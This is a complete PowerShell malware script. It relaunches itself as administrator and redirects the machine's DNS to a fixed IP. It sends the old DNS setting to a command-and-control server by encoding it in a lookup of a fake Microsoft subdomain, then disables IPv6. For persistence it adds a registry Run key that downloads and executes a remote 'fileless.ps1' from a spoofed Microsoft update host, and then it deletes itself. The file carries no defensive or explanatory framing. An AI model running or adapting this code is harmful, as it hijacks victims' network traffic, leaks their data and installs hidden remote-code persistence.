# Making sure this script is running as admin.
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){}
else
{
    Start-Process -FilePath "powershell" -ArgumentList "$($PSCommandPath)" -verb runAs
    return
}

# Get interface data
$name = Get-NetAdapter | Format-List -Property Name | Out-String
$name = $name.Split(":")[1] -replace "\s",""
$name
$index = Get-NetAdapter | Format-List -Property ifIndex | Out-String
$index = $index.Split(":")[1] -replace "\s",""
$index

# Save the current dns and send it to cnc.
$dns = Get-DnsClientServerAddress -InterfaceIndex 7 | Format-List -Property ServerAddresses | Out-String
$dns = $dns.Split("{")[1].Split("}")[0] -replace "\s",""
$dns
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses 192.168.52.130
Resolve-DnsName -Name "$dns.updatedns.microsoft.com"

# Turn off ipv6
Disable-NetAdapterBinding -Name $name -ComponentID ms_tcpip6

# Save oneliner in registry
cd HKLM:\software\Microsoft\Windows\CurrentVersion\run
$value = {C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "iex(New-Object System.Net.WebClient).DownloadString('http://checkupdates.microsoft.com/fileless.ps1')"}
New-ItemProperty -Path $pwd[0] -Name BatSoup -Value $value

# Delete self
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force

#Start-Sleep -s 3

# Get user id and logoff. forces the user to reconnect, and thus run the line in the reg.
#$id = ((quser | Where-Object { $_ -match $userName }) -split ' +')[-5]
#logoff $sessionId
